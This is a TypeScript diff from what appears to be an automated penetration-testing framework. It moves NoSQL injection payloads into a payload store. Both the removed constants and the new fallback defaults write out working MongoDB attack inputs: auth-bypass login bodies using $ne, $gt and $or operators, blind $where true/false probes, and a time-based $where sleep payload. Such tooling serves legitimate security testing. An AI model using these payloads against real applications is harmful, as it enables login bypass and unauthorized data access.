@@ -11,17 +11,7 @@ import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionRes
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { observeCompare, observeParse } from './observers'
-
-// Operator payloads are transport data, not a detection vocabulary.
-const MONGO_OPERATORS = ['$ne', '$gt', '$regex', '$exists', '$where', '$in', '$nin', '$or', '$and']
-const AUTH_BYPASS_BODIES = [
-  JSON.stringify({ username: { $ne: '' }, password: { $ne: '' } }),
-  JSON.stringify({ $or: [{ username: 'admin' }, { username: { $ne: '' } }], password: { $ne: '' } }),
-  JSON.stringify({ username: 'admin', password: { $gt: '' } }),
-]
-const BLIND_TRUE = JSON.stringify({ $where: '1==1' })
-const BLIND_FALSE = JSON.stringify({ $where: '1==2' })
-const TIME_PAYLOAD = JSON.stringify({ $where: "sleep(2000) || true" })
+import { getPayloadStore } from '../payloads/store'
 
 function urlWithParam(url: string, param: string, value: string): string {
   try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
@@ -43,8 +33,18 @@ export const nosqlInjection: TechniquePrimitive = {
     const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'filter'
     const steps: AttackStep[] = []
 
+    const authBypassBodies = ctx.payloadSet ?? getPayloadStore().getPayloads('nosql/mongo-operators', 'auth_bypass')
+    const mongoOperators = getPayloadStore().getPayloads('nosql/mongo-operators', 'mongo_operators')
+    const blindPayloads = getPayloadStore().getPayloads('nosql/mongo-operators', 'blind_true')
+    const blindFalsePayloads = getPayloadStore().getPayloads('nosql/mongo-operators', 'blind_false')
+    const timePayloads = getPayloadStore().getPayloads('nosql/mongo-operators', 'time_based')
+
+    const BLIND_TRUE = blindPayloads[0] ?? JSON.stringify({ $where: '1==1' })
+    const BLIND_FALSE = blindFalsePayloads[0] ?? JSON.stringify({ $where: '1==2' })
+    const TIME_PAYLOAD = timePayloads[0] ?? JSON.stringify({ $where: "sleep(2000) || true" })
+
     // Auth-bypass via operator objects in a JSON login/query body.
-    AUTH_BYPASS_BODIES.forEach((body, i) => {
+    authBypassBodies.forEach((body, i) => {
       steps.push({
         id: `nosql-bypass-${i}`,
         description: `NoSQL operator auth-bypass into ${param}`,
@@ -54,7 +54,7 @@ export const nosqlInjection: TechniquePrimitive = {
       })
     })
     // Operator injection into a query param (URL-encoded).
-    MONGO_OPERATORS.forEach((op, i) => {
+    mongoOperators.forEach((op, i) => {
       const val = JSON.stringify({ [op]: 1 })
       steps.push({
         id: `nosql-op-${i}`,
